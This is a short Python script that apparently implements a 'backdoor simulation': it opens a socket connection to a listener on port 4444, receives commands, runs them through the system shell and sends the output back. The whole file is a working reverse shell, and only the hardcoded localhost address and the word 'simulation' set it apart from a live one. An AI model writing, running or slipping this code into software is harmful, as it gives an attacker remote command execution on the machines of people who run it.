import socket
import subprocess
import os

def create_backdoor():
    """Simulate a backdoor that opens a reverse shell"""
    ip = "127.0.0.1"  # Local IP for example
    port = 4444

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b'Connected to backdoor.\n')
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            result = subprocess.run(command, shell=True, capture_output=True)
            s.send(result.stdout + result.stderr)
        s.close()
    except Exception as e:
        print(f"An error occurred: {e}")

def run_backdoor():
    print("Backdoor Simulation: Creating persistent access...")
    create_backdoor()

